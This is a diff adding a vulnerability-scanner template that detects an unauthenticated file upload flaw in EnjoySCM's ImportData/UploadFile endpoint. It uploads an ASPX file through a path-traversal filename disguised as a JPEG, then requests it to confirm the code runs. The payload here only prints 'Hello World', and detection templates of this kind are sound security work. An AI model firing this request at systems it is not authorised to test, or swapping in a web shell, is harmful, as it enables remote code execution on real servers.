@@ -1,0 +1,53 @@
+id: poc-enjoyscm-importdata-upload
+info:
+  name: EnjoySCM ImportData File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in EnjoySCM ImportData functionality.
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - name: "File Upload"
+    method: POST
+    path:
+      - "{{BaseURL}}/ImportData/UploadFile"
+    headers:
+      Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+    body: |
+      ------21909179191068471382830692394
+      Content-Disposition: form-data; name="file"; filename="../../../{{filename}}.aspx"
+      Content-Type: image/jpeg
+
+      <%@Page Language="C#"%><%Response.Write("Hello World");%>
+      ------21909179191068471382830692394--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"ObjectData\""
+          - "\"UniqueKey\""
+
+  - name: "Verify Upload"
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filename}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Hello World"
